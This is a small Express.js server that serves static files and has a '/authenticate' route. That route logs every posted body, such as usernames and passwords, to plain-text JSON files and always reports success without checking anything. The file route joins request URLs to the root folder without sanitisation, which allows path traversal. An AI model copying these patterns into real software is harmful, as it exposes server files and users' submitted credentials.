const fs        = require('fs');
const express   = require('express');
const app       = express();
const mime      = require('mime-types');

const PORT      = 8080;
const rootDir   = "./files"
const logsDir   = "./Logs"

//utility function for writing logs
var writeLog = function(data) {
    console.log("Writting data to ");

    var jsonString = JSON.stringify(data);
    var date = new Date();
    var dateString = date.toString().substring(0, date.toString().indexOf("(")-1).split(" ").join("-").replace(':', 'H').replace(':', 'M');//gives you a nicely formatted dated database
    var fileName = logsDir + "/UserLog " + dateString + ".json";

    fs.writeFile(fileName, jsonString, function(err) {
        if(err) {
            console.log(err);
            console.log("Have you configured and created the Logs folder yet?");
        }
        else
            console.log("The log file was successfully written!");
    });
};
//handles file reading and send responses of basic html reqs
var sendFile = (path, res) => {
    fs.readFile(path, function(err, data) {
        if (err)
            res.send(404);
        else {
            res.writeHead(200, {'Content-Type': mime.lookup(filePath)});
            res.write(data);
            res.end();
        }
    });
}

//logging
app.use((req, res, next) => {console.log('HTTP ' + req.method + ' request on\n    ' + req.url); next();})
app.use(express.urlencoded());//for posted data
app.use(express.json());

app.get('/', function (req, res) { 
    filePath = rootDir + "/index.html";
    sendFile(filePath, res);
})

app.get('/*', function (req, res) { 
    filePath = rootDir + req.url;
    sendFile(filePath, res);
})

app.post('/authenticate', (req, res) => {
    console.log(req.body);

    writeLog(req.body);

    res.writeHead(200, {"Content-type": mime.lookup(".json")});
    res.write(JSON.stringify({logged: true}));
    res.send();

})

app.listen(PORT, () => console.log('Example app listening on port ' + PORT + '!'))